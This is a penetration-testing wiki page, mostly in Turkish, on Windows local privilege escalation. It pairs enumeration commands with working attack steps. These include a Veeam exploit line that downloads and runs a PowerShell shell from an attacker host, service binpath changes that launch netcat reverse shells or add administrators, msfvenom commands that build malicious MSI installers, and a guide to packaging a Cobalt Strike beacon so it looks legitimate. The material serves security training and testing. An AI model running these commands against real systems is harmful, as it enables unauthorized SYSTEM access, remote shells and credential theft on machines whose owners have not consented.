# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Başlangıç Windows Teorisi

### Access Tokens

**Windows Access Tokens nedir bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'da integrity levels nedir bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows'ta sistemi **enumerate etmenizi**, executable çalıştırmanızı ve hatta **aktivitelerinizi tespit etmesini** engelleyebilecek farklı şeyler vardır. privilege escalation enumeration işlemine başlamadan önce bu **defenses** **mechanisms** hakkında **okuyun** ve hepsini **enumerate** edin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess process'leri, AppInfo secure-path kontrolleri bypass edildiğinde Prompt olmadan High IL seviyesine ulaşmak için kötüye kullanılabilir. Ayrıntılı UIAccess/Admin Protection bypass workflow'u için buraya bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation, keyfi bir SYSTEM registry write (RegPwn) için kötüye kullanılabilir:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Son Windows builds ayrıca, ayrıcalıklı bir local NTLM authentication'ın yeniden kullanılan bir SMB TCP connection üzerinden yansıtıldığı **SMB arbitrary-port** LPE yolunu da ekledi:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows sürümünde bilinen bir vulnerability olup olmadığını kontrol edin (uygulanan patches'i de kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft security vulnerabilities hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700’den fazla security vulnerabilities bulunur; bu da bir Windows environment’ın sunduğu **massive attack surface**’i gösterir.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env değişkenlerinde saklanan herhangi bir credential/Juicy info var mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl açacağınızı şurada öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; yürütülen komutlar, komut çağrıları ve scriptlerin bazı bölümleri buna dahildir. Ancak, tam yürütme ayrıntıları ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için, dokümantasyondaki "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell loglarından son 15 olayı görmek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Betiğin yürütülmesinin tam etkinlik ve tam içerik kaydı yakalanır, böylece her kod bloğu çalıştıkça belgelenir. Bu süreç, her etkinlik için kapsamlı bir denetim izi korur; bu da adli analiz ve kötü amaçlı davranışların incelenmesi için değerlidir. Tüm etkinliği yürütme sırasında belgelendirerek, süreç hakkında ayrıntılı içgörüler sağlanır.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için günlükleme olayları, Windows Event Viewer içinde şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görmek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Sistemyi, güncellemeler http**S** ile değil de http kullanılarak isteniyorsa, ele geçirebilirsiniz.

Aşağıdaki komutu cmd içinde çalıştırarak ağın non-SSL WSUS güncellemesi kullanıp kullanmadığını kontrol ederek başlarsınız:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdakiler:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Eğer şu tür bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Service komutu SYSTEM olarak çalıştırır.
## KrbRelayUp

Windows **domain** ortamlarında belirli koşullar altında bir **local privilege escalation** açığı bulunur. Bu koşullar; **LDAP signing**’in zorunlu olmaması, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasına izin veren self-rights’e sahip olması ve kullanıcıların domain içinde computer oluşturabilmesi yeteneğini içerir. Bu **gereksinimlerin** varsayılan ayarlarla karşılandığını not etmek önemlidir.

**Exploit** için [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresine bakın

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) bağlantısına bakın

## AlwaysInstallElevated

Eğer bu 2 register etkinse (değeri **0x1** ise), herhangi bir privilege seviyesindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **install** edebilir (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Eğer bir meterpreter oturumunuz varsa, bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz

### PowerUP

Güncel dizin içinde bir Windows MSI binary oluşturmak için power-up içindeki `Write-UserAddMSI` komutunu kullanın; bu, ayrıcalıkları yükseltmek için kullanılır. Bu script, bir kullanıcı/grup ekleme istemi çıkaran önceden derlenmiş bir MSI installer yazar (bu yüzden GIU erişimine ihtiyacınız olacak):
```
Write-UserAddMSI
```
Yalnızca oluşturulan binary’yi çalıştırarak ayrıcalıkları yükseltin.

### MSI Wrapper

Bu araçları kullanarak bir MSI wrapper oluşturmayı öğrenmek için bu eğitimi okuyun. Eğer sadece **command lines** çalıştırmak istiyorsanız, bir "**.bat**" dosyasını da wrap edebileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI Oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI Oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda yeni bir Windows EXE TCP payload **Generate** edin
- **Visual Studio**’yu açın, **Create a new project** seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**’e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçin ve **Create**’e tıklayın.
- 3 of 4. adıma (choose files to include) gelene kadar **Next**’e tıklamaya devam edin. **Add**’e tıklayın ve az önce oluşturduğunuz Beacon payload’ını seçin. Ardından **Finish**’e tıklayın.
- **Solution Explorer** içinde **AlwaysPrivesc** projesini vurgulayın ve **Properties** bölümünde **TargetPlatform** değerini **x86**’dan **x64**’e değiştirin.
- **Author** ve **Manufacturer** gibi değiştirebileceğiniz başka özellikler de vardır; bunlar yüklenen uygulamanın daha meşru görünmesini sağlayabilir.
- Projeye sağ tıklayın ve **View > Custom Actions** seçin.
- **Install** üzerine sağ tıklayın ve **Add Custom Action** seçin.
- **Application Folder** üzerine çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**’ye tıklayın. Bu, installer çalıştırılır çalıştırılmaz beacon payload’ının yürütülmesini sağlar.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak, **build it**.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötü amaçlı `.msi` dosyasının **installation** işlemini arka planda yürütmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu güvenlik açığını sömürmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Bu ayarlar neyin **loglandığını** belirler, bu yüzden dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, logların nereye gönderildiğini bilmek ilginçtir
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, **local Administrator passwords** yönetimi için tasarlanmıştır; domain’e katılmış bilgisayarlarda her parolanın **benzersiz, rastgele ve düzenli olarak güncellenen** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL’ler üzerinden yeterli izin verilmiş kullanıcılar tarafından erişilebilir; böylece yetkilendirilmişlerse local admin parolalarını görüntüleyebilirler.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Aktifse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**WDigest hakkında daha fazla bilgi bu sayfada**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** ile birlikte Microsoft, Local Security Authority (LSA) için geliştirilmiş koruma tanıttı; bu koruma, güvenilmeyen süreçlerin **belleğini okuma** veya kod enjeksiyonu yapma girişimlerini **engelleyerek** sistemi daha da güvenli hale getirir.\
[**LSA Protection hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard** **Windows 10**'da tanıtıldı. Amacı, bir cihazda depolanan kimlik bilgilerinin pass-the-hash saldırıları gibi tehditlere karşı korunmasını sağlamaktır.| [**Daha fazla bilgi için Credentials Guard burada.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Önbelleğe alınmış Kimlik Bilgileri

**Domain kimlik bilgileri** **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir security package tarafından doğrulandığında, kullanıcı için genellikle domain kimlik bilgileri oluşturulur.\
[**Cached Credentials hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Envanterle

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer **bazı ayrıcalıklı gruplara aitseniz, yetkileri yükseltebilirsiniz**. Ayrıcalıklı gruplar ve bunları yetki yükseltmek için nasıl kötüye kullanabileceğiniz hakkında burada bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Daha fazla bilgi edinin** bir **token**ın ne olduğu hakkında bu sayfada: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
İlginç tokenlar hakkında **bilgi edinmek** ve bunları nasıl kötüye kullanacağınızı öğrenmek için aşağıdaki sayfayı kontrol edin:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Ana klasörler
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Şifre Politikası
```bash
net accounts
```
### Panonun içeriğini al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan Processler

### File ve Folder Permissions

İlk olarak, processleri listelerken **process'in command line'ı içinde passwords olup olmadığını kontrol edin**.\
Bazı çalışan binary'lerin üzerine yazıp yazamayacağınızı veya mümkün [**DLL Hijacking attacks**](dll-hijacking/index.html) saldırılarını istismar etmek için binary klasöründe write permissions olup olmadığını kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman çalışan [**electron/cef/chromium debuggers**] olup olmadığını kontrol edin, bunu ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**İşlem binarylerinin izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Süreçlerin binary dosyalarının klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Bellek Parola madenciliği

Çalışan bir prosesin memory dump’ını **procdump** ile sysinternals’tan oluşturabilirsiniz. FTP gibi servislerin **kimlik bilgileri memory içinde açık metin olarak** bulunur, memory’yi dump etmeyi ve kimlik bilgilerini okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM olarak çalışan Uygulamalar bir kullanıcının bir CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" üzerine tıklayın

## Services

Service Triggers, Windows’un belirli koşullar oluştuğunda bir service başlatmasına izin verir (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, vb.). SERVICE_START rights olmadan bile, trigger’larını tetikleyerek ayrıcalıklı services'i çoğu zaman başlatabilirsiniz. Enumaration ve activation tekniklerini burada görün:

-
{{#ref}}
service-triggers.md
{{#endref}}

Services listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir service hakkında bilgi almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her servis için gerekli ayrıcalık seviyesini kontrol etmek için _Sysinternals_’tan **accesschk** ikilisinin kullanılması önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" herhangi bir service'i değiştirebiliyor mu diye kontrol etmeniz önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştir

Eğer bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Bunu kullanarak etkinleştirebilirsiniz
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1 için upnphost hizmetinin çalışması için SSDPSRV’ye bağımlı olduğunu dikkate alın**

**Bu soruna yönelik başka bir geçici çözüm**, şunu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

"Authenticated users" grubunun bir hizmet üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, hizmetin çalıştırılabilir binary’sini değiştirmek mümkündür. **sc**’yi değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlatın
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Yetkiler çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis binary’sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: Yetki yeniden yapılandırmasını sağlar ve servis yapılandırmalarını değiştirme imkanı doğurur.
- **WRITE_OWNER**: Sahiplik edinmeye ve yetki yeniden yapılandırmasına izin verir.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yeteneğini miras alır.
- **GENERIC_ALL**: Ayrıca servis yapılandırmalarını değiştirme yeteneğini miras alır.

Bu zafiyetin tespiti ve exploitation için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binaries weak permissions

**Bir servis tarafından çalıştırılan binary’yi değiştirebiliyor musunuz** ya da binary’nin bulunduğu klasörde **write permissions** var mı kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
**wmic** kullanarak bir servis tarafından çalıştırılan tüm binary’leri öğrenebilir (system32 dışında) ve yetkilerinizi **icacls** ile kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** de kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Hizmet kayıt defteri değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol** edebilirsiniz:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** hesaplarının `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer öyleyse, servis tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary’nin Path’ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Bazı Windows Accessibility özellikleri, daha sonra bir **SYSTEM** süreci tarafından bir HKLM session key içine kopyalanan kullanıcıya özel **ATConfig** key’leri oluşturur. Bir registry **symbolic link race**, bu yetkili yazmayı **herhangi bir HKLM path**’e yönlendirebilir ve böylece arbitrary HKLM **value write** primitive’i sağlar.

Key locations (örnek: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` yüklü accessibility features listesini tutar.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` kullanıcı kontrollü configuration saklar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** value’sunu doldurun.
2. Secure-desktop copy’yi tetikleyin (ör. **LockWorkstation**), bu da AT broker flow’u başlatır.
3. **Race’i kazanın** ve `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerinde bir **oplock** yerleştirin; oplock tetiklendiğinde **HKLM Session ATConfig** key’ini korumalı bir HKLM target’a işaret eden bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği value’yu yönlendirilmiş HKLM path’ine yazar.

Arbitrary HKLM value write elde ettikten sonra, service configuration values üzerine yazarak LPE’ye geçin:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabildiği bir service seçin (ör. **`msiserver`**) ve yazmadan sonra onu tetikleyin. **Not:** public exploit implementation, race’in bir parçası olarak **locks the workstation**.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Eğer bir registry üzerinde bu izne sahipseniz, bu **bundan alt registry'ler oluşturabileceğiniz** anlamına gelir. Windows services durumunda bu, **keyfi code çalıştırmak için yeterlidir:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable path'i tırnak içinde değilse, Windows bir space öncesindeki her bitişi çalıştırmaya çalışır.

